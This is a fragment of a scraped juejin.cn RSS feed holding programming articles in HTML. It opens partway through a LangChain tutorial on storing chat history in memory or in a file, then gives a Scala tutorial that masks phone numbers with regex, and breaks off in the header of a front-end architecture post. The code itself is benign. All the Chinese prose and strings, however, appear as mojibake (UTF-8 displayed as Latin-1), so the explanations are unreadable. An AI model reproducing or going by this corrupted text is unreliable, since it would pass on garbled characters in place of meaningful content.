        stream=<span class="hljs-literal">True</span>,
    )

    ai_content = <span class="hljs-string">""</span>

    <span class="hljs-keyword">for</span> chunk <span class="hljs-keyword">in</span> response:
        content = chunk.choices[<span class="hljs-number">0</span>].delta.content
        <span class="hljs-keyword">if</span> content <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            <span class="hljs-keyword">break</span>
        ai_content += content
        <span class="hljs-built_in">print</span>(content, flush=<span class="hljs-literal">True</span>, end=<span class="hljs-string">""</span>)

    chat_history.add_user_message(query)
    chat_history.add_ai_message(ai_content)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">""</span>)
</code></pre>
<p><strong>äº¤äº’ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash">Human: ä½ å¥½
AI[] chat_history
ä½ å¥½ï¼æˆ‘æ˜¯ChatGPTï¼Œæœ‰ä»€ä¹ˆå¯ä»¥å¸®åŠ©ä½ çš„å—ï¼Ÿ
Human: æˆ‘å«ccc
AI[HumanMessage(content=<span class="hljs-string">'ä½ å¥½'</span>, additional_kwargs={}, response_metadata={}), AIMessage(content=<span class="hljs-string">'ä½ å¥½ï¼æˆ‘æ˜¯ChatGPTï¼Œæœ‰ä»€ä¹ˆå¯ä»¥å¸®åŠ©ä½ çš„å—ï¼Ÿ'</span>, additional_kwargs={}, response_metadata={}, tool_calls=[], invalid_tool_calls=[])] chat_history
ä½ å¥½cccï¼å¾ˆé«˜å…´è®¤è¯†ä½ ï¼Œæœ‰ä»€ä¹ˆæˆ‘å¯ä»¥å¸®åŠ©ä½ çš„å—ï¼Ÿ
Human: q
(ç¨‹åºé€€å‡º)
</code></pre>
<p><strong>memory.txt æ–‡ä»¶å†…å®¹ï¼ˆæŒä¹…åŒ–å­˜å‚¨ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span><span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"human"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"data"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-attr">"content"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ä½ å¥½"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"additional_kwargs"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"response_metadata"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-punctuation">{</span><span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ai"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"data"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-attr">"content"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ä½ å¥½ï¼æˆ‘æ˜¯ChatGPTï¼Œæœ‰ä»€ä¹ˆå¯ä»¥å¸®åŠ©ä½ çš„å—ï¼Ÿ"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"additional_kwargs"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"response_metadata"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"tool_calls"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"invalid_tool_calls"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-punctuation">{</span><span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"human"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"data"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-attr">"content"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"æˆ‘å«ccc"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"additional_kwargs"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"response_metadata"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-punctuation">{</span><span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ai"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"data"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-attr">"content"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ä½ å¥½cccï¼å¾ˆé«˜å…´è®¤è¯†ä½ ï¼Œæœ‰ä»€ä¹ˆæˆ‘å¯ä»¥å¸®åŠ©ä½ çš„å—ï¼Ÿ"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"additional_kwargs"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"response_metadata"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"tool_calls"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"invalid_tool_calls"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">]</span>
</code></pre>
<h3 data-id="heading-14">äº”ã€å¸¸ç”¨ API æ–¹æ³•</h3>
<h4 data-id="heading-15">InMemoryChatMessageHistory / FileChatMessageHistory å…±æœ‰æ–¹æ³•ï¼š</h4>






























<table><thead><tr><th>æ–¹æ³•</th><th>è¯´æ˜</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td><code>add_user_message(message)</code></td><td>æ·»åŠ ç”¨æˆ·æ¶ˆæ¯</td><td><code>chat_history.add_user_message("ä½ å¥½")</code></td></tr><tr><td><code>add_ai_message(message)</code></td><td>æ·»åŠ  AI æ¶ˆæ¯</td><td><code>chat_history.add_ai_message("ä½ å¥½ï¼")</code></td></tr><tr><td><code>messages</code> å±æ€§</td><td>è·å–æ‰€æœ‰æ¶ˆæ¯</td><td><code>chat_history.messages</code></td></tr><tr><td><code>clear()</code></td><td>æ¸…ç©ºå†å²</td><td><code>chat_history.clear()</code></td></tr></tbody></table>
<h3 data-id="heading-16">å…­ã€ä½¿ç”¨åœºæ™¯å¯¹æ¯”</h3>



































<table><thead><tr><th>åœºæ™¯</th><th>æ¨èç»„ä»¶</th><th>åŸå› </th></tr></thead><tbody><tr><td>ç®€å•å¯¹è¯æœºå™¨äºº</td><td>InMemoryChatMessageHistory</td><td>æ— éœ€æŒä¹…åŒ–ï¼Œç®€å•å¿«é€Ÿ</td></tr><tr><td>å®¢æœç³»ç»Ÿ</td><td>FileChatMessageHistory</td><td>éœ€è¦ä¿å­˜å¯¹è¯è®°å½•</td></tr><tr><td>èŠå¤©åº”ç”¨</td><td>FileChatMessageHistory</td><td>ç”¨æˆ·éœ€è¦å†å²è®°å½•</td></tr><tr><td>ä¸€æ¬¡æ€§ä»»åŠ¡</td><td>InMemoryChatMessageHistory</td><td>æ— éœ€ä¿å­˜å†å²</td></tr><tr><td>æµ‹è¯•å¼€å‘</td><td>InMemoryChatMessageHistory</td><td>æ–¹ä¾¿è°ƒè¯•ï¼Œé‡å¯å³æ¸…ç©º</td></tr></tbody></table>
<h3 data-id="heading-17">ä¸ƒã€æ³¨æ„äº‹é¡¹</h3>
<ol>
<li><strong>æ–‡ä»¶å­˜å‚¨è·¯å¾„</strong>ï¼šä½¿ç”¨ <code>FileChatMessageHistory</code> æ—¶ç¡®ä¿ç¨‹åºæœ‰æ–‡ä»¶è¯»å†™æƒé™</li>
<li><strong>æ€§èƒ½è€ƒè™‘</strong>ï¼šå¤§é‡å¯¹è¯å†å²å¯èƒ½å½±å“å“åº”é€Ÿåº¦ï¼Œå¯è€ƒè™‘å®ç°å†å²æ¶ˆæ¯æˆªæ–­ç­–ç•¥</li>
<li><strong>å®‰å…¨æ€§</strong>ï¼šæ–‡ä»¶å­˜å‚¨æ—¶æ³¨æ„æ•æ„Ÿä¿¡æ¯çš„ä¿æŠ¤</li>
<li><strong>å¹¶å‘é—®é¢˜</strong>ï¼šå¤šè¿›ç¨‹/çº¿ç¨‹è®¿é—®åŒä¸€æ–‡ä»¶æ—¶éœ€è¦åŠ é”æœºåˆ¶</li>
</ol>
<h3 data-id="heading-18">å…«ã€æ‰©å±•çŸ¥è¯†</h3>
<p>LangChain è¿˜æ”¯æŒå…¶ä»– ChatMessage å†å²å­˜å‚¨æ–¹å¼ï¼š</p>
<ul>
<li><strong>SQLChatMessageHistory</strong> - æ•°æ®åº“å­˜å‚¨</li>
<li><strong>RedisChatMessageHistory</strong> - Redis ç¼“å­˜å­˜å‚¨</li>
<li><strong>MongoDBChatMessageHistory</strong> - MongoDB å­˜å‚¨</li>
<li><strong>PostgreSQLChatMessageHistory</strong> - PostgreSQL å­˜å‚¨</li>
</ul>
<p>è¿™äº›éƒ½éœ€è¦é¢å¤–çš„ä¾èµ–å’Œé…ç½®ï¼Œé€‚åˆç”Ÿäº§ç¯å¢ƒçš„å¤§è§„æ¨¡åº”ç”¨ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æƒ³è¦æ›´å¤šï¼Œé‚£å°±â€œå¤šç»§æ‰¿â€]]></title>    <link>https://juejin.cn/post/7592520539152220169</link>    <guid>https://juejin.cn/post/7592520539152220169</guid>    <pubDate>2026-01-08T01:13:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592520539152220169" data-draft-id="7592497088791592987" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æƒ³è¦æ›´å¤šï¼Œé‚£å°±â€œå¤šç»§æ‰¿â€"/> <meta itemprop="keywords" content="ä»£ç è§„èŒƒ"/> <meta itemprop="datePublished" content="2026-01-08T01:13:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å“ˆåŸºé—»"/> <meta itemprop="url" content="https://juejin.cn/user/1584857862123275"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æƒ³è¦æ›´å¤šï¼Œé‚£å°±â€œå¤šç»§æ‰¿â€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1584857862123275/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å“ˆåŸºé—»
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T01:13:43.000Z" title="Thu Jan 08 2026 01:13:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><pre><code class="hljs language-markdown" lang="markdown">ç›®æ ‡ï¼šæ‰‹æœºå·æ‰“ç 
<span class="hljs-bullet">*</span>          136612345678  -&gt;  136<span class="hljs-strong">****</span>5678
<span class="hljs-bullet">*</span> ä»»åŠ¡ï¼šä»æ–‡æœ¬æ–‡ä»¶ä¸­ï¼Œè¯»å–ä¸€æ®µå†…å®¹ï¼ŒæŠŠå…¶ä¸­çš„æ‰‹æœºå·è¯†åˆ«å‡ºæ¥ï¼Œå¹¶æ‰“ç 
</code></pre>
<p>å…ˆå»ºç«‹ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶Â <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5bcdf29eb8954c8ea895fd19d86baa4f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOI5Z-66Ze7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768439623&amp;x-signature=XCBF4bZKVNHhFGCooeOsC9lzWeI%3D" alt="image.png" loading="lazy"/></p>
<pre><code class="hljs language-scss" lang="scss">  def <span class="hljs-selector-tag">main</span>(args: Array[String]): Unit = {
    val <span class="hljs-attribute">content</span> = scala<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.Source</span><span class="hljs-selector-class">.fromFile</span>("address.txt")<span class="hljs-selector-class">.mkString</span>

    <span class="hljs-built_in">println</span>("è¯»å…¥è¿›æ¥çš„å†…å®¹æ˜¯ï¼š")
    <span class="hljs-built_in">println</span>(content)

<span class="hljs-comment">//    å†™ä¸€ä¸ªæ‰‹æœºå·çš„æ­£åˆ™</span>
    val reg = "<span class="hljs-number">1</span><span class="hljs-selector-attr">[35678]</span>\d{<span class="hljs-number">9</span>}"<span class="hljs-selector-class">.r</span>
<span class="hljs-comment">//    åŒ¹é…è¾“å‡º</span>
    reg<span class="hljs-selector-class">.findAllIn</span>(content)<span class="hljs-selector-class">.foreach</span>(println)
  }
</code></pre>
<h6 data-id="heading-0">replaceAllInï¼Œå…¨éƒ¨æ›¿æ¢</h6>
<pre><code class="hljs language-ini" lang="ini">   æ›¿æ¢ï¼šæ­£åˆ™çš„å…¸å‹çš„åº”ç”¨åœºæ™¯
    val <span class="hljs-attr">newContent</span> = reg.replaceAllIn(content,<span class="hljs-string">"è¿™æœ‰ä¸ªæ‰‹æœºå·"</span>)
</code></pre>
<h5 data-id="heading-1">æ›´æ”¹åï¼š</h5>
<pre><code class="hljs language-scss" lang="scss">  def <span class="hljs-selector-tag">main</span>(args: Array[String]): Unit = {
    val <span class="hljs-attribute">content</span> = scala<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.Source</span><span class="hljs-selector-class">.fromFile</span>("address.txt")<span class="hljs-selector-class">.mkString</span>

    <span class="hljs-built_in">println</span>("è¯»å…¥è¿›æ¥çš„å†…å®¹æ˜¯ï¼š")
    <span class="hljs-built_in">println</span>(content)

<span class="hljs-comment">//    å†™ä¸€ä¸ªæ‰‹æœºå·çš„æ­£åˆ™</span>
    val reg = "<span class="hljs-number">1</span><span class="hljs-selector-attr">[35678]</span>\d{<span class="hljs-number">9</span>}"<span class="hljs-selector-class">.r</span>
<span class="hljs-comment">////    åŒ¹é…è¾“å‡º</span>
<span class="hljs-comment">//    reg.findAllIn(content).foreach(println)</span>
<span class="hljs-comment">////    æ›¿æ¢ï¼šæ­£åˆ™çš„å…¸å‹çš„åº”ç”¨åœºæ™¯</span>
<span class="hljs-comment">//    replaceAllIn,å…¨éƒ¨æ›¿æ¢</span>
<span class="hljs-comment">//    åœ¨contentä¸­é€šè¿‡æ­£åˆ™å»æ‰¾å­—ç¬¦ä¸²ï¼Œæ‰¾åˆ°äº†ä¹‹åï¼Œå°±æ¢æˆæŒ‡å®šçš„å†…å®¹ï¼Œå¹¶æŠŠæœ€ç»ˆçš„ç»“æœä¿å­˜åˆ°newContent</span>
<span class="hljs-comment">//    val newContent = reg.replaceAllIn(content,"è¿™æœ‰ä¸ªæ‰‹æœºå·")</span>
    val newContent = reg<span class="hljs-selector-class">.replaceAllIn</span>(content,m =&gt;{
//      println(s"åœ¨replaceAllInå‡½æ•°ä¸­ï¼Œæ‰¾åˆ°çš„å†…å®¹æ˜¯ï¼š${mat}")
<span class="hljs-comment">//      "æ‰‹æœºå·ï¼š" + m</span>
<span class="hljs-comment">//      mçš„å‰ä¸‰ä½ + "****" + mçš„åå››ä½</span>
      m<span class="hljs-selector-class">.toString</span>()<span class="hljs-selector-class">.substring</span>(<span class="hljs-number">0</span>,<span class="hljs-number">3</span>) + "****" + m<span class="hljs-selector-class">.toString</span>()<span class="hljs-selector-class">.substring</span>(<span class="hljs-number">7</span>)
    })

    <span class="hljs-built_in">println</span>("æ›¿æ¢åçš„å†…å®¹æ˜¯ï¼š")
    <span class="hljs-built_in">println</span>(newContent)
  }
</code></pre>
<h5 data-id="heading-2">---------------------------------------------------------------------------------------------------------</h5>
<h5 data-id="heading-3">å†æ¬¡ä¼˜åŒ–å</h5>
<pre><code class="hljs language-scss" lang="scss">  def <span class="hljs-selector-tag">main</span>(args: Array[String]): Unit = {
    val <span class="hljs-attribute">content</span> = scala<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.Source</span><span class="hljs-selector-class">.fromFile</span>("address.txt")<span class="hljs-selector-class">.mkString</span>

    <span class="hljs-built_in">println</span>("è¯»å…¥è¿›æ¥çš„å†…å®¹æ˜¯ï¼š")
    <span class="hljs-built_in">println</span>(content)

<span class="hljs-comment">//    å†™ä¸€ä¸ªæ‰‹æœºå·çš„æ­£åˆ™</span>
    val reg = "(<span class="hljs-number">1</span>[<span class="hljs-number">35678</span>]\d{<span class="hljs-number">2</span>})(\d{<span class="hljs-number">3</span>})(\d{<span class="hljs-number">4</span>})"<span class="hljs-selector-class">.r</span>
<span class="hljs-comment">////    åŒ¹é…è¾“å‡º</span>
<span class="hljs-comment">//    reg.findAllIn(content).foreach(println)</span>
<span class="hljs-comment">////    æ›¿æ¢ï¼šæ­£åˆ™çš„å…¸å‹çš„åº”ç”¨åœºæ™¯</span>
<span class="hljs-comment">//    replaceAllIn,å…¨éƒ¨æ›¿æ¢</span>
<span class="hljs-comment">//    åœ¨contentä¸­é€šè¿‡æ­£åˆ™å»æ‰¾å­—ç¬¦ä¸²ï¼Œæ‰¾åˆ°äº†ä¹‹åï¼Œå°±æ¢æˆæŒ‡å®šçš„å†…å®¹ï¼Œå¹¶æŠŠæœ€ç»ˆçš„ç»“æœä¿å­˜åˆ°newContent</span>
<span class="hljs-comment">//    val newContent = reg.replaceAllIn(content,"è¿™æœ‰ä¸ªæ‰‹æœºå·")</span>
    val newContent = reg<span class="hljs-selector-class">.replaceAllIn</span>(content,m =&gt;{
      println(m.group(<span class="hljs-number">0</span>))<span class="hljs-comment">// å½“å‰æ­£åˆ™åŒ¹é…åˆ°å®Œæ•´çš„å†…å®¹</span>
      <span class="hljs-built_in">println</span>(m.group(<span class="hljs-number">1</span>))<span class="hljs-comment">// å½“å‰æ­£åˆ™çš„ç¬¬ä¸€ä¸ªåˆ†ç»„ï¼ˆç¬¬ä¸€ä¸ªå°æ‹¬å·ï¼‰åŒ¹é…åˆ°çš„å†…å®¹</span>
      <span class="hljs-built_in">println</span>(m.group(<span class="hljs-number">2</span>))
      <span class="hljs-built_in">println</span>(m.group(<span class="hljs-number">3</span>))

      m<span class="hljs-selector-class">.group</span>(<span class="hljs-number">1</span>) + "***" + m<span class="hljs-selector-class">.group</span>(<span class="hljs-number">3</span>)
    })

    <span class="hljs-built_in">println</span>("æ›¿æ¢åçš„å†…å®¹æ˜¯ï¼š")
    <span class="hljs-built_in">println</span>(newContent)
  
    
<span class="hljs-comment">//    æŠŠæ›¿æ¢ä¹‹åçš„å†…å®¹ï¼Œå†™å…¥åˆ°ä¸€ä¸ªæ–°çš„æ–‡ä»¶ä¸­</span>
    val fileWriter = new <span class="hljs-built_in">FileWriter</span>("newAddress.txt")
    fileWriter<span class="hljs-selector-class">.write</span>(newContent)
    fileWriter<span class="hljs-selector-class">.close</span>() 
  }
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å‰ç«¯å‘æ¶æ„çªå›´ç³»åˆ— - æ¶æ„æ–¹æ³•ï¼ˆä¸‰ï¼‰ï¼šå‰ç«¯è®¾è®¡æ–‡æ¡£çš„å†™ä½œæ¨¡å¼]]></title>    <link>https://juejin.cn/post/7592520539152990217</link>    <guid>https://juejin.cn/post/7592520539152990217</guid>    <pubDate>2026-01-08T02:35:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592520539152990217" data-draft-id="7592759902675091502" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å‰ç«¯å‘æ¶æ„çªå›´ç³»åˆ— - æ¶æ„æ–¹æ³•ï¼ˆä¸‰ï¼‰ï¼šå‰ç«¯è®¾è®¡æ–‡æ¡£çš„å†™ä½œæ¨¡å¼"/> <meta itemprop="keywords" content="å‰ç«¯,æ¶æ„"/> <meta itemprop="datePublished" content="2026-01-08T02:35:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å‰ç«¯ç‹å£®å£®"/> <meta itemprop="url" content="https://juejin.cn/user/4473272506789485"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å‰ç«¯å‘æ¶æ„çªå›´ç³»åˆ— - æ¶æ„æ–¹æ³•ï¼ˆä¸‰ï¼‰ï¼šå‰ç«¯è®¾è®¡æ–‡æ¡£çš„å†™ä½œæ¨¡å¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4473272506789485/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å‰ç«¯ç‹å£®å£®
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T02:35:40.000Z" title="Thu Jan 08 2026 02:35:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
